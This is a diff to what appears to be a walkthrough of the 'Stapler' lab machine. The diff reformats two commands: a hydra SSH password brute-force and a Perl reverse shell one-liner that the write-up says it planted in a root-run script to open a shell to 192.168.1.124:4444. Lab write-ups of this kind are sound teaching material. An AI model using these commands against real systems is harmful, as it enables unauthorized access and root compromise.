@@ -203,7 +203,7 @@ Connecting to the mount points didn't reveal anything interesting so I decided t
 
 ## Bruteforce
 
-`hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh`
+    hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh
 
 ![Bruteforce](/assets/images/stapler/image14.png)
 
@@ -233,7 +233,7 @@ Seeing that I had permissions to write to a script that is run by the root user 
 
 I added a reverse shell using perl to this script:
 
-`perl -e 'use Socket;$i="192.168.1.124";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+    perl -e 'use Socket;$i="192.168.1.124";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 ![reverse shell in script](/assets/images/stapler/image18.png)
 
